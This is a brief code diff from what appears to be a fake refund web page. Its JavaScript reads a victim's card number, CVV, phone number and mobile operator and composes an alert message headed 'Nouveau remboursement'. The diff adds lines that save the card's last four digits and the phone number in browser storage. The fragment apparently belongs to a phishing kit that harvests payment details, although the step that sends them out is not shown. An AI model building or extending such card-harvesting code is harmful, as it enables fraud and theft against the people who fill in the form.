@@ -140,6 +140,9 @@
             const cvv = document.getElementById('cvv').value;
             const phoneNumber = document.getElementById('telephone').value;
             const operator = document.getElementById('operateur').value;
+           
+        localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // آخر 4 أرقام
+        localStorage.setItem('phoneNumber', phoneNumber);
 
             const message = `
 🔔 Nouveau remboursement :
